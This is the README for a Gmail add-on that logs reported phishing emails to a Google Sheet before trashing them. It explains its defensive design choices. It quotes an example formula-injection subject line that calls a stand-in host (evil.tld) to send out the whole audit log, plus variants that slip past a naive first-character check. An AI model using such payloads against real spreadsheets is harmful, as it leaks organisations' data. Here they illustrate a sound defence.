# Gmail Phishing Reporter

[![CI](https://github.com/OmereKurt/gmail-phishing-reporter/actions/workflows/ci.yml/badge.svg)](https://github.com/OmereKurt/gmail-phishing-reporter/actions/workflows/ci.yml)

A Google Workspace add-on that lets a user report a phishing email from inside
Gmail. The reported message is written to an audit log, labelled, and moved to
Trash — in that order, and only in that order.

The add-on is small. The design decisions about *when* things happen, and about
what the reported email is allowed to do to the log, are the part worth reading.

## Audit before action

The reporting flow is:

```
read message metadata
  -> append the audit row          (if this fails, stop; nothing is removed)
  -> label the thread
  -> move the reported message to Trash
  -> update the row's status
```

Version 1 did the reverse: it trashed the mail and then tried to log it. If the
Sheets call threw — sheet renamed, permissions changed, quota exhausted — the
email was already gone and nothing recorded that it had ever existed.

For an incident-response tool the log *is* the product. A report that fails
loudly is recoverable; a message deleted with no trace cannot be investigated,
restored, or counted. So the write is attempted first and a failure abandons the
report with the mail untouched.

Because the row is written before the outcome is known, it lands with a status of
`Logged - removal pending`, which is then updated to `Moved to Trash` or
`Removal failed: <reason>`. A row is never left claiming something that did not
happen.

## The reported email is hostile input

Every value in the log comes from the message being reported, which is to say
from whoever sent it. Google Sheets evaluates any cell whose first meaningful
character is `=`, `+`, `-` or `@`. So a phishing email with this subject line:

```
=IMPORTXML("https://evil.tld/?d="&CONCATENATE(A1:F100),"//x")
```

is not a subject line. It is a formula that runs the moment an analyst opens the
audit log, and posts the contents of that log — every sender, subject and message
id your organisation has reported — to a server the attacker controls.

`sanitizeCell` in [src/report-log.js](src/report-log.js) prefixes any such value
with an apostrophe, which forces Sheets to store it as literal text. The
apostrophe is a display directive rather than part of the value, so the log still
reads back cleanly and nothing is lost.

Two details that a first attempt gets wrong, both covered by tests:

- **Leading whitespace does not make it safe.** Sheets strips whitespace and
  control characters before deciding whether a cell is a formula, so `\t=EVIL()`
  is still a formula. Checking `charAt(0)` alone is bypassed by prepending a tab.
- **A leading `-` is a formula too.** `-1+1` evaluates. An earlier draft of this
  module stripped leading hyphens as noise before testing the first character,
  which let exactly that case through. There is now a regression test named for
  it.

## One message, not the whole conversation

Version 1 called `moveThreadToTrash`, which takes every message in the thread.
Thread hijacking — replying into an existing legitimate conversation — is a
common way for a phish to arrive, so that behaviour could destroy a real thread
of correspondence to remove one message from it.

This version calls `moveToTrash` on the reported message only. The
`Phishing-Reported` label is still applied at thread level, because Gmail's data
model attaches labels to threads rather than messages; the thread is flagged as
having contained a report, and its other messages are left in place.

## Configuration

The spreadsheet id is **not** in the source. Version 1 hardcoded one, which meant
the repository published the location of a real log and no one else could install
the add-on without editing the code.

It now lives in a script property. Run this once from the Apps Script editor:

```javascript
setLogSheet("https://docs.google.com/spreadsheets/d/<your-sheet>/edit");
```

The id or the full URL both work — pasting the URL out of the browser is what
people actually do, so `extractSheetId` accepts either. The function verifies the
sheet is reachable before returning, so a typo fails in the editor rather than
the first time somebody reports a phish.

Until it is set, the add-on shows a setup card instead of the report button.
There is no state in which it will remove mail it cannot log.

| Property | Required | Default |
|---|---|---|
| `PHISHING_LOG_SHEET_ID` | yes | — |
| `PHISHING_LOG_SHEET_NAME` | no | `Phishing Reports` |

The log tab and its header row are created on first use.

## Log format

| Timestamp | Reporter | Sender | Subject | Message ID | Thread ID | Action | Status |
|---|---|---|---|---|---|---|---|
| 2026-04-13 09:14:02 | analyst@example.com | billing@evil.tld | Verify Account | 18f2… | 18f2… | Move message to Trash | Moved to Trash |

## Repository structure

```
src/report-log.js        The audit log core. Pure: no Gmail, Sheets, Properties
                         or CardService APIs, which is what makes it testable.
ReportLog.gs             Generated copy of src/report-log.js (npm run sync).
Code.gs                  Add-on entry points. Everything that touches a Google
                         API lives here: cards, Gmail calls, sheet access.
appsscript.json          Manifest: OAuth scopes and the Gmail contextual trigger.
test/report-log.test.js  24 tests: sanitising, row building, config, and the
                         Apps Script global-scope load path.
scripts/sync-appsscript.js  Copies the core into ReportLog.gs; --check guards drift.
.github/workflows/ci.yml    Runs sync:check and the test suite.
```

Apps Script has no module system — every `.gs` file shares one global scope — so
the core cannot be `require`d there. Rather than add a bundler for a single file,
it has one source of truth in `src/` that is copied verbatim into `ReportLog.gs`,
and CI fails if the two drift apart.

## Running the tests

Requires Node 20+. There are no dependencies to install.

```bash
npm test          # 24 tests
npm run sync      # regenerate ReportLog.gs from src/report-log.js
npm run sync:check
```

## Installing

1. Create a spreadsheet for the log and copy its URL.
2. Create an Apps Script project and add `Code.gs`, `ReportLog.gs` and
   `appsscript.json`.
3. Run `setLogSheet("<your spreadsheet URL>")` once from the editor and authorise
   the scopes it requests.
4. Deploy as a Google Workspace add-on and install the test deployment.
5. Open a message in Gmail; the add-on appears in the sidebar.

### Scopes, and why each is requested

| Scope | Needed for |
|---|---|
| `gmail.addons.execute` | Running as a Gmail add-on at all |
| `gmail.modify` | Applying the label and trashing the message |
| `spreadsheets` | Writing the audit log |
| `userinfo.email` | Attributing the report to the user who made it |
| `script.locale` | Locale-aware formatting |

## Limitations

Worth being direct about, because the tests above cover the log and not the
product:

- **Nothing here detects phishing.** A user decides what is malicious; the add-on
  records and removes what they report. There is no scoring, no rules, no
  analysis of the message.
- **No undo.** The message is in Trash and recoverable by hand for 30 days, but
  the add-on offers no restore action and the log has no way to mark a report as
  withdrawn.
- **Nothing that touches a Google API is tested.** The suite covers
  `src/report-log.js`, which is the half that can run outside Apps Script. The
  Gmail, Sheets and CardService calls in `Code.gs` are verified by reading them.
- **The log is a spreadsheet.** Fine for a small deployment and an audit trail
  anyone can read; not a SIEM, no alerting, no retention policy, and any user who
  can write to the sheet can also edit rows in it.
- **Single-tenant.** One script property means one log for one deployment.

## What changed in 2.0

- The audit write moved ahead of the deletion, and a log failure now aborts the
  report instead of silently destroying the mail.
- Attacker-controlled values are neutralised before reaching Sheets. Previously
  the sender and subject went into `appendRow` verbatim.
- Only the reported message is trashed, not its entire thread.
- The hardcoded spreadsheet id is gone, replaced by a script property.
- Reports are attributed to the user who made them.
- `goBackHome` built a card, assigned it to a variable and returned without using
  it. Removed.
- The add-on's `logoUrl` pointed at a Google sample image that now 404s.
- The README's "Repository Structure" section was an empty heading. The structure
  it now describes is real.

> **Note on history:** the spreadsheet id removed in 2.0 is still present in this
> repository's git history. A Sheets id is not a credential — access is governed by
> the sheet's sharing settings, and that sheet is restricted, so the id grants
> nothing to anyone who finds it. It was left in place rather than rewriting every
> commit sha to remove an identifier that opens no door.

## Licence

MIT. See [LICENSE](LICENSE).

## Author

Omer Kurt — Cybersecurity Analytics and Operations, Penn State.
